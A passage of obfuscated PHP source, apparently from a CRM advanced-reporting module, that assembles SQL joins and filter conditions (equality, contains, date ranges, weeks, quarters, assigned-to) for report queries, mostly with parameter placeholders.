false,$ZZZZZZZZZZZc2 = 0){$this->ZZZZZZZZZZH77[$ZZZZZZZZZZZc2][$ZZZZm12['name']] = "t".$this->ZZZZZZZZZZK1010;$this->ZZZZZZZZZZK1010++;if(!$ZZZZZZZZZZZU2020){if(!in_array($ZZZZZZZZZZZc2,$this->ZZZZZZZZZZQ1616)){if($ZZZZm12 == $this->ZZZZZZZZZZO1414[$ZZZZZZZZZZZc2]){if(!isset($this->ZZZZZZZZZZH77[$this->ZZZZZx23[$ZZZZZZZZZZZc2]->relationDescr->joinModule][$this->ZZZZZx23[$ZZZZZZZZZZZc2]->relationDescr->joinTable1])){$this->ZZZZZZZZZZZh7($this->ZZZZZZZZZZN1313[$this->ZZZZZx23[$ZZZZZZZZZZZc2]->relationDescr->joinModule][$this->ZZZZZx23[$ZZZZZZZZZZZc2]->relationDescr->joinTable1],false,$this->ZZZZZx23[$ZZZZZZZZZZZc2]->relationDescr->joinModule);} $this->ZZZZZZZZZZI88[] = $this->ZZZZZZZZZZZM1212($ZZZZm12, $this->ZZZZZZZZZZN1313[$this->ZZZZZx23[$ZZZZZZZZZZZc2]->relationDescr->joinModule][$this->ZZZZZx23[$ZZZZZZZZZZZc2]->relationDescr->joinTable1], $ZZZZZZZZZZZc2, $this->ZZZZZx23[$ZZZZZZZZZZZc2]->relationDescr->joinField1, "LEFT", $this->ZZZZZx23[$ZZZZZZZZZZZc2]->relationDescr->joinField2, $this->ZZZZZx23[$ZZZZZZZZZZZc2]->relationDescr->joinModule);$this->ZZZZZZZZZZQ1616[] = $ZZZZZZZZZZZc2;}else{$this->ZZZZZZZZZZZh7($this->ZZZZZZZZZZO1414[$ZZZZZZZZZZZc2],false,$ZZZZZZZZZZZc2);$this->ZZZZZZZZZZI88[] = $this->ZZZZZZZZZZZM1212($ZZZZm12,$this->ZZZZZZZZZZO1414[$ZZZZZZZZZZZc2],$ZZZZZZZZZZZc2,null,"LEFT",null,$ZZZZZZZZZZZc2);}}else{$this->ZZZZZZZZZZI88[] = $this->ZZZZZZZZZZZM1212($ZZZZm12,$this->ZZZZZZZZZZO1414[$ZZZZZZZZZZZc2],$ZZZZZZZZZZZc2,null,"LEFT",null,$ZZZZZZZZZZZc2);}}} function ZZZZZZZZZZZV2121($ZZZZZZZZZZZW2222,$ZZZc2){$field = $ZZZc2[$ZZZZZZZZZZZW2222->fieldName];if($field['columnname']=="assigned_user_id" || $field['columnname']=="created_by" || $field['columnname']=="modified_user_id"){$ZZZZZZZZZZZc2 = $field['module'];if(!isset($this->ZZZZZZZZZZH77[$field["module"]][$field['tablename']])){$this->ZZZZZZZZZZZh7($this->ZZZZZZZZZZN1313[$field["module"]][$field["tablename"]],false,$field["module"]);} if(!isset($this->ZZZZZZZZZZH77[$ZZZZZZZZZZZc2]["users"])){$this->ZZZZZZZZZZH77[$ZZZZZZZZZZZc2]['users'] = "t".$this->ZZZZZZZZZZK1010;$this->ZZZZZZZZZZK1010++;$this->ZZZZZZZZZZI88[] = "LEFT JOIN users ".$this->ZZZZZZZZZZH77[$ZZZZZZZZZZZc2]['users']." ON ".$this->ZZZZZZZZZZH77[$ZZZZZZZZZZZc2]['users'].".id = ".$this->ZZZZZZZZZZH77[$ZZZZZZZZZZZc2][$field['tablename']].".".$field['columnname'];} global $AdvancedReporting_username_sequence;$ZZS1818 = "case when (".$this->ZZZZZZZZZZH77[$ZZZZZZZZZZZc2]['users'].".user_name not like \"\") then CONCAT(".($AdvancedReporting_username_sequence=='last-first'?$this->ZZZZZZZZZZH77[$ZZZZZZZZZZZc2]['users'].".last_name,' ',".$this->ZZZZZZZZZZH77[$ZZZZZZZZZZZc2]['users'].".first_name":$this->ZZZZZZZZZZH77[$ZZZZZZZZZZZc2]['users'].".first_name,' ',".$this->ZZZZZZZZZZH77[$ZZZZZZZZZZZc2]['users'].".last_name").") end ";}elseif($this->ZZZZS1818->ZZZZZy24($field)){$moduleName = $this->ZZZZZZZZZZY2424($field);$ZZZZZZZZZZZc2 = $field["module"];$ZZZz25 = array();$ZZT1919 = count($moduleName);for($Zf5 = 0;$Zf5 < $ZZT1919;$Zf5++){$ZZZZZZZZZZZf5 = $this->ZZZZZZZZZZZ2525($moduleName,$ZZZZZZZZZZZc2,$field);$ZZZZZZZZZZZg6 = $this->db->ZZZo14($moduleName[$Zf5]);if($ZZZZZZZZZZZf5 !==false){if(!isset($this->ZZZZZZZZZZH77[$ZZZZZZZZZZZf5][$ZZZZZZZZZZZg6['field'][0]['tablename']])){$this->ZZZZZZZZZZZh7($this->ZZZZZZZZZZN1313[$ZZZZZZZZZZZf5][$ZZZZZZZZZZZg6['field'][0]['tablename']],false,$ZZZZZZZZZZZf5);} $ZZZz25[] = $this->ZZZZZZZZZZH77[$ZZZZZZZZZZZf5][$ZZZZZZZZZZZg6['field'][0]['tablename']].".`".$ZZZZZZZZZZZg6['field'][0]['columnname']."`";}else{if(!isset($this->ZZZZZZZZZZH77[$ZZZZZZZZZZZc2][$field['fieldname'].$ZZZZZZZZZZZg6['relation']["tablename"]])){$this->ZZZZZZZZZZH77[$ZZZZZZZZZZZc2][$field['fieldname'].$ZZZZZZZZZZZg6['relation']["tablename"]] = "t".$this->ZZZZZZZZZZK1010;$this->ZZZZZZZZZZK1010++;$this->ZZZZZZZZZZI88[] = "LEFT JOIN `".$ZZZZZZZZZZZg6['relation']["tablename"] ."` AS ".$this->ZZZZZZZZZZH77[$ZZZZZZZZZZZc2][$field['fieldname'].$ZZZZZZZZZZZg6['relation']["tablename"]] ." ON ".$this->ZZZZZZZZZZH77[$ZZZZZZZZZZZc2][$field['fieldname'].$ZZZZZZZZZZZg6['relation']["tablename"]].".`".$ZZZZZZZZZZZg6['relation']["entityidfield"] ."` = `".$this->ZZZZZZZZZZH77[$ZZZZZZZZZZZc2][$field['tablename']]."`.`".$field['columnname']."`";} $ZZZz25[] = $this->ZZZZZZZZZZH77[$ZZZZZZZZZZZc2][$field['fieldname'].$ZZZZZZZZZZZg6['relation']["tablename"]].".`".$ZZZZZZZZZZZg6['field'][0]['columnname']."`";}} $ZZS1818 = "(" .implode(" OR ",$ZZZz25).")";}else{if(!isset($this->ZZZZZZZZZZH77[$field["module"]][$field['tablename']])){$this->ZZZZZZZZZZZh7($this->ZZZZZZZZZZN1313[$field["module"]][$field["tablename"]],false,$field["module"]);} $ZZS1818 = "`".$this->ZZZZZZZZZZH77[$field["module"]][$field['tablename']]."`.`".$field['columnname']."`";$ZZS1818 = str_replace('#alias#',$this->ZZZZZZZZZZH77[$field["module"]][$field['tablename']],$ZZS1818);} return $ZZS1818;} function ZZZZZZZZZZZX2323($ZZZZZZZZZZZW2222,$ZZZc2){$ZZS1818 = " AND ";if($ZZZZZZZZZZZW2222->connector =="or" || $ZZZZZZZZZZZW2222->connector =="OR"){$ZZS1818 = " OR ";} $ZZZZZZZW2222 = null;if(isset($ZZZc2[$ZZZZZZZZZZZW2222->fieldName])){$field = $ZZZc2[$ZZZZZZZZZZZW2222->fieldName];$fieldName = $this->ZZZZZZZZZZZV2121($ZZZZZZZZZZZW2222,$ZZZc2);$ZZZZZZZZZZZY2424 = array("assigned_user_id", "created_by", "modified_user_id", "team_id", "team_set_id");$ZZZZZZZZZZZZ2525 = in_array($field['columnname'], $ZZZZZZZZZZZY2424);switch ($ZZZZZZZZZZZW2222->condition){case "neq": $ZZZZZZZZZZZZa0 = "";if(in_array($field['uitype'],array('enum', 'dynamicenum'))) {$ZZZZZZZZZZZZa0.= " $fieldName NOT IN(";$ZZZZZZZW2222 = array();$ZZZZZq16 = array();$ZZT1919 = count($ZZZZZZZZZZZW2222->value);for($Zf5 = 0;$Zf5<$ZZT1919;$Zf5++){$ZZZZZZZW2222[] = $ZZZZZZZZZZZW2222->value[$Zf5];$ZZZZZq16[] = '?';} $ZZZZZZZZZZZZa0.= implode(' , ',$ZZZZZq16);$ZZZZZZZZZZZZa0.= ") ";$ZZS1818.= " ($ZZZZZZZZZZZZa0 OR $fieldName IS NULL) ";}elseif(in_array($field['uitype'],array('multienum'))){$ZZS1818.= " $fieldName <> ? ";$ZZZZZZZW2222 = $this->ZZZZS1818->ZZZZZU2020($ZZZZZZZZZZZW2222->value, "^");$ZZZZZZZW2222 = implode(",", $ZZZZZZZW2222);$ZZS1818.= " OR ($fieldName IS NULL) ";}else{$ZZZZZZZZZZZZa0.= " NOT $fieldName = ? ";$ZZZZZZZW2222 = $ZZZZZZZZZZZW2222->value[0];$ZZS1818.= " ($ZZZZZZZZZZZZa0 OR $fieldName IS NULL) ";} break;case "eq": if(in_array($field['uitype'],array('enum', 'dynamicenum'))) {$ZZS1818.= " $fieldName IN(";$ZZZZZZZW2222 = array();$ZZZZZq16 = array();$ZZT1919 = count($ZZZZZZZZZZZW2222->value);for($Zf5 = 0;$Zf5<$ZZT1919;$Zf5++){$ZZZZZZZW2222[] = $ZZZZZZZZZZZW2222->value[$Zf5];$ZZZZZq16[] = '?';} $ZZS1818.= implode(' , ',$ZZZZZq16);$ZZS1818.= ") ";}elseif(in_array($field['uitype'],array('multienum'))){$ZZS1818.= " $fieldName = ? ";$ZZZZZZZW2222 = $this->ZZZZS1818->ZZZZZU2020($ZZZZZZZZZZZW2222->value, "^");$ZZZZZZZW2222 = implode(",", $ZZZZZZZW2222);}else{$ZZS1818.= " $fieldName = ? ";$ZZZZZZZW2222 = $ZZZZZZZZZZZW2222->value[0];} break;case "cont": if(in_array($field['uitype'],array('enum', 'dynamicenum'))) {$ZZS1818.= " $fieldName IN(";$ZZZZZZZW2222 = array();$ZZZZZq16 = array();$ZZT1919 = count($ZZZZZZZZZZZW2222->value);for($Zf5 = 0;$Zf5<$ZZT1919;$Zf5++){$ZZZZZZZW2222[] = $ZZZZZZZZZZZW2222->value[$Zf5];$ZZZZZq16[] = '?';} $ZZS1818.= implode(' , ',$ZZZZZq16);$ZZS1818.= ") ";}elseif(in_array($field['uitype'],array('multienum'))){$ZZS1818.= " 1=2 ";$ZZZZZZZW2222 = array();$ZZZZZZZZZZZZb1 = $this->ZZZZS1818->ZZZZZU2020($ZZZZZZZZZZZW2222->value, "^");$ZZZZZZZZZZZZb1 = $this->ZZZZS1818->ZZZZZU2020($ZZZZZZZZZZZZb1, "%");foreach ($ZZZZZZZZZZZZb1 as $ZZZZZZZZZZZW2222) {$ZZZZZZZW2222[] = $ZZZZZZZZZZZW2222;$ZZS1818 .= " OR {$fieldName} like ?";}}else{$ZZS1818.= " $fieldName like ? ";$ZZZZZZZW2222 = "%".$ZZZZZZZZZZZW2222->value[0]."%";} break;case "ncont": if(in_array($field['uitype'],array('enum', 'dynamicenum'))) {$ZZS1818.= " $fieldName NOT IN(";$ZZZZZZZW2222 = array();$ZZZZZq16 = array();$ZZT1919 = count($ZZZZZZZZZZZW2222->value);for($Zf5 = 0;$Zf5<$ZZT1919;$Zf5++){$ZZZZZZZW2222[] = $ZZZZZZZZZZZW2222->value[$Zf5];$ZZZZZq16[] = '?';} $ZZS1818.= implode(' , ',$ZZZZZq16);$ZZS1818.= ") ";}elseif(in_array($field['uitype'],array('multienum'))) {$ZZS1818 .= " 1=1 ";$ZZZZZZZW2222 = array();$ZZZZZZZZZZZZb1 = $this->ZZZZS1818->ZZZZZU2020($ZZZZZZZZZZZW2222->value, "^");$ZZZZZZZZZZZZb1 = $this->ZZZZS1818->ZZZZZU2020($ZZZZZZZZZZZZb1, "%");foreach ($ZZZZZZZZZZZZb1 as $ZZZZZZZZZZZW2222) {$ZZZZZZZW2222[] = $ZZZZZZZZZZZW2222;$ZZS1818 .= " AND {$fieldName} NOT like ?";}} else {$ZZS1818.= " $fieldName NOT like ? ";$ZZZZZZZW2222 = "%".$ZZZZZZZZZZZW2222->value[0]."%";} break;case "start": $ZZS1818.= " $fieldName like ? ";$ZZZZZZZW2222 = $ZZZZZZZZZZZW2222->value[0]."%";break;case "end": $ZZS1818.= " $fieldName like ? ";$ZZZZZZZW2222 = "%".$ZZZZZZZZZZZW2222->value[0];break;case "empty": $ZZS1818.= " ($fieldName IS NULL OR $fieldName ='')";$ZZZZZZZW2222 = null;break;case "filled": $ZZS1818.= " ($fieldName IS NOT NULL AND $fieldName <>'')";$ZZZZZZZW2222 = null;break;case "before": $ZZS1818.= " $fieldName < ?";if($this->ZZZZS1818->ZZZZZD33($field)){$ZZZZZZZZZZZZc2 = strtotime($ZZZZZZZZZZZW2222->value[0]." ".$ZZZZZZZZZZZW2222->value[1].":".$ZZZZZZZZZZZW2222->value[2].":00 ".$ZZZZZZZZZZZW2222->value[3]);$ZZZz25 = new DateTime();$ZZZz25->setTimestamp($ZZZZZZZZZZZZc2);$ZZZZZZH77 = $ZZZz25->format("Y-m-d H:i:s");$ZZZZZZH77 = PlatformConnector::ZZZZZZG66($this->ZZZZZZZZZZJ99, $ZZZZZZH77);$ZZZZZZZW2222 = $ZZZZZZH77;}else{$ZZZZZZZW2222 = $ZZZZZZZZZZZW2222->value[0];} break;case "after": $ZZS1818.= " $fieldName > ?";if($this->ZZZZS1818->ZZZZZD33($field)){$ZZZZZZZZZZZZc2 = strtotime($ZZZZZZZZZZZW2222->value[0]." ".$ZZZZZZZZZZZW2222->value[1].":".$ZZZZZZZZZZZW2222->value[2].":00 ".$ZZZZZZZZZZZW2222->value[3]);$ZZZz25 = new DateTime();$ZZZz25->setTimestamp($ZZZZZZZZZZZZc2);$ZZZZZZH77 = $ZZZz25->format("Y-m-d H:i:s");$ZZZZZZH77 = PlatformConnector::ZZZZZZG66($this->ZZZZZZZZZZJ99, $ZZZZZZH77);$ZZZZZZZW2222 = $ZZZZZZH77;}else{$ZZZZZZZW2222 = $ZZZZZZZZZZZW2222->value[0];} break;case "today": $ZZZZZZZZZZZZd3 = PlatformConnector::ZZZZZZI88($this->ZZZZZZZZZZJ99);$ZZZZZZZZZZZZe4 = PlatformConnector::ZZZZZZK1010($this->ZZZZZZZZZZJ99);$ZZS1818.= " $fieldName BETWEEN '{$ZZZZZZZZZZZZd3}' AND '{$ZZZZZZZZZZZZe4}' ";$ZZZZZZZW2222 = array();break;case "tomorrow": $ZZZZZZZZZZZZd3 = PlatformConnector::ZZZZZZI88($this->ZZZZZZZZZZJ99);$ZZZZZZZZZZZZe4 = PlatformConnector::ZZZZZZK1010($this->ZZZZZZZZZZJ99);$ZZZZZZZZZZZZf5 = new DateTime($ZZZZZZZZZZZZd3);$ZZZZZZZZZZZZg6 = new DateTime($ZZZZZZZZZZZZe4);$ZZZZZZZZZZZZd3 = $ZZZZZZZZZZZZf5->modify("+1 day")->format("Y-m-d H:i:s");$ZZZZZZZZZZZZe4 = $ZZZZZZZZZZZZg6->modify("+1 day")->format("Y-m-d H:i:s");$ZZS1818.= " $fieldName BETWEEN '{$ZZZZZZZZZZZZd3}' AND '{$ZZZZZZZZZZZZe4}' ";break;case "yesterday": $ZZZZZZZZZZZZd3 = PlatformConnector::ZZZZZZI88($this->ZZZZZZZZZZJ99);$ZZZZZZZZZZZZe4 = PlatformConnector::ZZZZZZK1010($this->ZZZZZZZZZZJ99);$ZZZZZZZZZZZZf5 = new DateTime($ZZZZZZZZZZZZd3);$ZZZZZZZZZZZZg6 = new DateTime($ZZZZZZZZZZZZe4);$ZZZZZZZZZZZZd3 = $ZZZZZZZZZZZZf5->modify("-1 day")->format("Y-m-d H:i:s");$ZZZZZZZZZZZZe4 = $ZZZZZZZZZZZZg6->modify("-1 day")->format("Y-m-d H:i:s");$ZZS1818.= " $fieldName BETWEEN '{$ZZZZZZZZZZZZd3}' AND '{$ZZZZZZZZZZZZe4}' ";break;case "aftert": $ZZS1818.= " " . ZZZZZZZa0::getDate($fieldName) . " > ?";$ZZZZZZZZZZZZe4 = PlatformConnector::ZZZZZZK1010($this->ZZZZZZZZZZJ99);$ZZZZZZZZZZZZg6 = new DateTime($ZZZZZZZZZZZZe4);$ZZZZZZZW2222 = $ZZZZZZZZZZZZg6->modify("+1 day")->format("Y-m-d H:i:s");break;case "tilly": $ZZS1818.= " " . ZZZZZZZa0::getDate($fieldName) . " < ?";$ZZZZZZZZZZZZd3 = PlatformConnector::ZZZZZZI88($this->ZZZZZZZZZZJ99);$ZZZZZZZZZZZZf5 = new DateTime($ZZZZZZZZZZZZd3);$ZZZZZZZW2222 = $ZZZZZZZZZZZZf5->modify("-1 day")->format("Y-m-d H:i:s");break;case "between": $ZZS1818.= " $fieldName >= ? AND $fieldName <= ?";if($this->ZZZZS1818->ZZZZZC22($field)){$ZZZZZZZW2222 = array($ZZZZZZZZZZZW2222->value[0],$ZZZZZZZZZZZW2222->value[1]);}elseif($this->ZZZZS1818->ZZZZZD33($field)){$ZZZZZZZZZZZZh7 = strtotime($ZZZZZZZZZZZW2222->value[0]." ".$ZZZZZZZZZZZW2222->value[1].":".$ZZZZZZZZZZZW2222->value[2].":00 ".$ZZZZZZZZZZZW2222->value[3]);$ZZZZZZZZZZZZi8 = strtotime($ZZZZZZZZZZZW2222->value[4]." ".$ZZZZZZZZZZZW2222->value[5].":".$ZZZZZZZZZZZW2222->value[6].":00 ".$ZZZZZZZZZZZW2222->value[7]);$ZZZZZZZZZZZZj9 = new DateTime();$ZZZZZZZZZZZZk10 = new DateTime();$ZZZZZZZZZZZZj9->setTimestamp($ZZZZZZZZZZZZh7);$ZZZZZZZZZZZZk10->setTimestamp($ZZZZZZZZZZZZi8);$ZZZZZZZZZZZZd3 = $ZZZZZZZZZZZZj9->format("Y-m-d H:i:s");$ZZZZZZZZZZZZe4 = $ZZZZZZZZZZZZk10->format("Y-m-d H:i:s");$ZZZZZZZZZZZZd3 = PlatformConnector::ZZZZZZG66($this->ZZZZZZZZZZJ99, $ZZZZZZZZZZZZd3);$ZZZZZZZZZZZZe4 = PlatformConnector::ZZZZZZG66($this->ZZZZZZZZZZJ99, $ZZZZZZZZZZZZe4);$ZZZZZZZW2222 = array($ZZZZZZZZZZZZd3,$ZZZZZZZZZZZZe4);}else{$ZZZZZZZW2222 = array($ZZZZZZZZZZZW2222->value[0],$ZZZZZZZZZZZW2222->value[1]);} break;case "nbetween": $ZZS1818.= " ($fieldName < ? OR $fieldName > ?)";if($this->ZZZZS1818->ZZZZZC22($field)){$ZZZZZZZW2222 = array($ZZZZZZZZZZZW2222->value[0],$ZZZZZZZZZZZW2222->value[1]);}elseif($this->ZZZZS1818->ZZZZZD33($field)){$ZZZZZZZZZZZZh7 = strtotime($ZZZZZZZZZZZW2222->value[0]." ".$ZZZZZZZZZZZW2222->value[1].":".$ZZZZZZZZZZZW2222->value[2].":00 ".$ZZZZZZZZZZZW2222->value[3]);$ZZZZZZZZZZZZi8 = strtotime($ZZZZZZZZZZZW2222->value[4]." ".$ZZZZZZZZZZZW2222->value[5].":".$ZZZZZZZZZZZW2222->value[6].":00 ".$ZZZZZZZZZZZW2222->value[7]);$ZZZZZZZZZZZZj9 = new DateTime();$ZZZZZZZZZZZZk10 = new DateTime();$ZZZZZZZZZZZZj9->setTimestamp($ZZZZZZZZZZZZh7);$ZZZZZZZZZZZZk10->setTimestamp($ZZZZZZZZZZZZi8);$ZZZZZZZZZZZZd3 = $ZZZZZZZZZZZZj9->format("Y-m-d H:i:s");$ZZZZZZZZZZZZe4 = $ZZZZZZZZZZZZk10->format("Y-m-d H:i:s");$ZZZZZZZZZZZZd3 = PlatformConnector::ZZZZZZG66($this->ZZZZZZZZZZJ99, $ZZZZZZZZZZZZd3);$ZZZZZZZZZZZZe4 = PlatformConnector::ZZZZZZG66($this->ZZZZZZZZZZJ99, $ZZZZZZZZZZZZe4);$ZZZZZZZW2222 = array($ZZZZZZZZZZZZd3,$ZZZZZZZZZZZZe4);}else{$ZZZZZZZW2222 = array($ZZZZZZZZZZZW2222->value[0],$ZZZZZZZZZZZW2222->value[1]);} break;case "ndays": $ZZS1818.= " $fieldName > ".ZZZZZZZa0::ZZZZZZZZZw22()." AND $fieldName < ".ZZZZZZZa0::ZZZZZZZZZx23("+", "day", "!", ZZZZZZZa0::ZZZZZZZZZw22());$ZZZZZZZW2222 = array($ZZZZZZZZZZZW2222->value[0]);break;case "pdays": $ZZS1818.= " $fieldName < ".ZZZZZZZa0::ZZZZZZZZZw22()." AND $fieldName > ".ZZZZZZZa0::ZZZZZZZZZx23("-", "day", "!", ZZZZZZZa0::ZZZZZZZZZw22());$ZZZZZZZW2222 = array($ZZZZZZZZZZZW2222->value[0]);break;case "gtdays": $ZZS1818.= " $fieldName > ".ZZZZZZZa0::ZZZZZZZZZx23("+", "day", "!", ZZZZZZZa0::ZZZZZZZZZw22());$ZZZZZZZW2222 = array($ZZZZZZZZZZZW2222->value[0]);break;case "ltdays": $ZZS1818.= " $fieldName < ".ZZZZZZZa0::ZZZZZZZZZx23("-", "day", "!", ZZZZZZZa0::ZZZZZZZZZw22());$ZZZZZZZW2222 = array($ZZZZZZZZZZZW2222->value[0]);break;case "tweek": $ZZS1818.= " $fieldName BETWEEN '".date("Y-m-d",strtotime('this week'))."' AND '".date("Y-m-d",strtotime('this week +6 days'))."'";$ZZZZZZZW2222 = array();break;case "lweek": $ZZS1818.= " $fieldName BETWEEN '".date("Y-m-d",strtotime('this week -7 days'))."' AND '".date("Y-m-d",strtotime('this week -1 days'))."'";$ZZZZZZZW2222 = array();break;case "nweek": $ZZS1818.= " $fieldName BETWEEN '".date("Y-m-d",strtotime('this week +7 days'))."' AND '".date("Y-m-d",strtotime('this week +13 days'))."'";$ZZZZZZZW2222 = array();break;case "tmonth": $ZZS1818.= " $fieldName BETWEEN '".date("Y-m-01")."' AND '".date("Y-m-t")."'";$ZZZZZZZW2222 = array();break;case "lmonth": $ZZZZZZZZZZZZl11 = date("Y-m-01 H:i:s", strtotime('-1 month'));$ZZZZZZZZZZZZm12 = date("Y-m-t H:i:s", strtotime('-1 month'));$ZZZZZZZZZZZZl11 = PlatformConnector::ZZZZZZA00($this->ZZZZZZZZZZJ99, $ZZZZZZZZZZZZl11, $field['uitype']);$ZZZZZZZZZZZZm12 = PlatformConnector::ZZZZZZA00($this->ZZZZZZZZZZJ99, $ZZZZZZZZZZZZm12, $field['uitype']);$ZZZZZZZZZZZZd3 = PlatformConnector::ZZZZZZG66($this->ZZZZZZZZZZJ99, $ZZZZZZZZZZZZl11 . " 00:00:00");$ZZZZZZZZZZZZe4 = PlatformConnector::ZZZZZZG66($this->ZZZZZZZZZZJ99, $ZZZZZZZZZZZZm12 . " 23:59:59");$ZZS1818.= " $fieldName BETWEEN '{$ZZZZZZZZZZZZd3}' AND '{$ZZZZZZZZZZZZe4}' ";$ZZZZZZZW2222 = array();break;case "tyear": $ZZS1818.= " $fieldName BETWEEN '".date("Y-01-01")."' AND '".date("Y-12-t")."'";$ZZZZZZZW2222 = array();break;case "lyear": $ZZZZZZZZZZZZl11 = date("Y-01-01 H:i:s", strtotime('-1 year'));$ZZZZZZZZZZZZm12 = date("Y-12-t H:i:s", strtotime('-1 year'));$ZZZZZZZZZZZZl11 = PlatformConnector::ZZZZZZA00($this->ZZZZZZZZZZJ99, $ZZZZZZZZZZZZl11);$ZZZZZZZZZZZZm12 = PlatformConnector::ZZZZZZA00($this->ZZZZZZZZZZJ99, $ZZZZZZZZZZZZm12);$ZZZZZZZZZZZZd3 = PlatformConnector::ZZZZZZZZZZZZn13($this->ZZZZZZZZZZJ99, $ZZZZZZZZZZZZl11 . " 00:00:00");$ZZZZZZZZZZZZe4 = PlatformConnector::ZZZZZZZZZZZZn13($this->ZZZZZZZZZZJ99, $ZZZZZZZZZZZZm12 . " 23:59:59");$ZZS1818.= " $fieldName BETWEEN '{$ZZZZZZZZZZZZd3}' AND '{$ZZZZZZZZZZZZe4}' ";$ZZZZZZZW2222 = array();break;case "nquarter": $ZZZZZZZZZZZZo14 = "'".date("Y-m-d",strtotime('+3 months'))."'";$ZZZZZZZZZZZZp15 = ZZZZZZZa0::ZZZZZZZZZr17($fieldName);$ZZZZZZZZZZZZq16 = ZZZZZZZa0::ZZZZZZZZZr17($ZZZZZZZZZZZZo14);$ZZZZZZZZZZZZr17 = ZZZZZZZa0::ZZZZZZZZZp15($fieldName);$ZZZZZZZZZZZZs18 = ZZZZZZZa0::ZZZZZZZZZp15($ZZZZZZZZZZZZo14);$ZZS1818.= " {$ZZZZZZZZZZZZp15} = {$ZZZZZZZZZZZZq16} AND {$ZZZZZZZZZZZZr17} = {$ZZZZZZZZZZZZs18} ";$ZZZZZZZW2222 = array();break;case "lquarter": $ZZZZZZZZZZZZt19 = "'".date("Y-m-d",strtotime('-3 months'))."'";$ZZZZZZZZZZZZp15 = ZZZZZZZa0::ZZZZZZZZZr17($fieldName);$ZZZZZZZZZZZZu20 = ZZZZZZZa0::ZZZZZZZZZr17($ZZZZZZZZZZZZt19);$ZZZZZZZZZZZZr17 = ZZZZZZZa0::ZZZZZZZZZp15($fieldName);$ZZZZZZZZZZZZv21 = ZZZZZZZa0::ZZZZZZZZZp15($ZZZZZZZZZZZZt19);$ZZS1818.= " {$ZZZZZZZZZZZZp15} = {$ZZZZZZZZZZZZu20} AND {$ZZZZZZZZZZZZr17} = {$ZZZZZZZZZZZZv21} ";$ZZZZZZZW2222 = array();break;case "gt": $ZZS1818.= " $fieldName > ?";$ZZZZZZZW2222 = array($ZZZZZZZZZZZW2222->value[0]);break;case "lt": $ZZS1818.= " $fieldName < ?";$ZZZZZZZW2222 = array($ZZZZZZZZZZZW2222->value[0]);break;case "egt": $ZZS1818.= " $fieldName >= ?";$ZZZZZZZW2222 = array($ZZZZZZZZZZZW2222->value[0]);break;case "elt": $ZZS1818.= " $fieldName <= ?";$ZZZZZZZW2222 = array($ZZZZZZZZZZZW2222->value[0]);break;case "unchecked": $ZZS1818.= " $fieldName = 0";$ZZZZZZZW2222 = array();break;case "checked": $ZZS1818.= " $fieldName = 1";$ZZZZZZZW2222 = array();break;case "assignedto": global $current_user;$ZZS1818.= " $fieldName LIKE ?";$ZZZZZZZZZZZZw22 = $current_user->first_name;$ZZZZZZZZZZZZx23 = $current_user->last_name;if($ZZZZZZZZZZZZw22 == ""){$ZZZZZZZZZZZZy24 = $ZZZZZZZZZZZZx23;}else{$ZZZZZZZZZZZZy24 = $ZZZZZZZZZZZZw22." ".$ZZZZZZZZZZZZx23;} $ZZZZZZZW2222 = array("%".$ZZZZZZZZZZZZy24."%");break;}}else{$ZZS1818 = " ";} return array("sql"=>$ZZS1818,"param"=>$ZZZZZZZW2222);} function ZZZZZZZZZZZZz25($ZZZZZZZZZZZZA00,$ZZZc2){$ZZS1818 = "AND ";if($ZZZZZZZZZZZZA00->connector =="OR"){$ZZS1818 = "OR ";} $ZZS1818.="(1=1 ";$ZZT1919 = count($ZZZZZZZZZZZZA00->filters);$ZZZx23 = array();for($Zf5 = 0;$Zf5<$ZZT1919;$Zf5++){$ZZZZZq16 = $this->ZZZZZZZZZZZX2323($ZZZZZZZZZZZZA00->filters[$Zf5],$ZZZc2);$ZZS1818.= $ZZZZZq16["sql"] . " ";if($ZZZZZq16["param"]!==null){if(is_array($ZZZZZq16["param"])){$ZZZx23 = array_merge($ZZZx23,$ZZZZZq16["param"]);}else{$ZZZx23[] = $ZZZZZq16["param"];}}} $ZZS1818.= ") ";return array("sql"=>$ZZS1818,"params"=>$ZZZx23);} function ZZZZZZZZZZZZB11($ZZZZZZZZZZZZC22,$ZZZZZZZZZZZZD33,$ZZZM1212){$ZZT1919 = count($ZZZZZZZZZZZZD33);$ZZZV2121 = array();for($Zf5=0;$Zf5<$ZZT1919;$Zf5++){if(isset($ZZZZZZZZZZZZC22[$ZZZZZZZZZZZZD33[$Zf5]])){$ZZZV2121[] = $ZZZZZZZZZZZZC22[$ZZZZZZZZZZZZD33[$Zf5]];}} if(count($ZZZM1212) > 0){foreach($ZZZM1212 as $ZZZZZZZZZZZt19) {$ZZZV2121[] = array('tablename' => $ZZZZZZZZZZZt19['table'], 'columnname' => $ZZZZZZZZZZZt19['column'], 'fieldname' => $ZZZZZZZZZZZt19['name'], 'fieldlabel' => $ZZZZZZZZZZZt19['bareTitle'], 'uitype' => $ZZZZZZZZZZZt19['uitype'], 'typeofdata' => 'V~O', 'module' => 'X',);}} return $ZZZV2121;} function ZZZZZZZZZZZZE44($ZZZZZZZZZZj9){$ZZZc2 = array();$ZZT1919 = count($ZZZZZZZZZZj9);for($Zf5=0;$Zf5<$ZZT1919;$Zf5++){$ZZZc2 = array_merge($ZZZc2,$ZZZZZZZZZZj9[$Zf5]->ZZZZZZZZZV2121($Zf5));} return $ZZZc2;} function ZZZZZZZZZZZZF55($ZZZZZZZZZZj9){$ZZS1818 = array();$ZZT1919 = count($ZZZZZZZZZZj9);for($Zf5=0;$Zf5<$ZZT1919;$Zf5++){$ZZS1818[] = array();} return $ZZS1818;} function ZZZZZZZZZZZZG66($ZZZZZZZZZZj9){$ZZS1818 = array();$ZZT1919 = count($ZZZZZZZZZZj9);for($Zf5=0;$Zf5<$ZZT1919;$Zf5++){$ZZS1818[] = $ZZZZZZZZZZj9[$Zf5]->ZZZZZZZZZZZF55();} return $ZZS1818;} function ZZZZZZZZZZZZH77($ZZZZZZZZZZj9){$ZZS1818 = array();$ZZT1919 = count($ZZZZZZZZZZj9);for($Zf5=0;$Zf5<$ZZT1919;$Zf5++){$ZZS1818[] = $ZZZZZZZZZZj9[$Zf5]->ZZZZZZZZZZZZI88();} return $ZZS1818;} function ZZZZZZZZZZZZJ99(){$ZZq16 = " AND (1=1 ";$ZZT1919 = count($this->ZZZZZZZZZZQ1616);for($Zf5 = 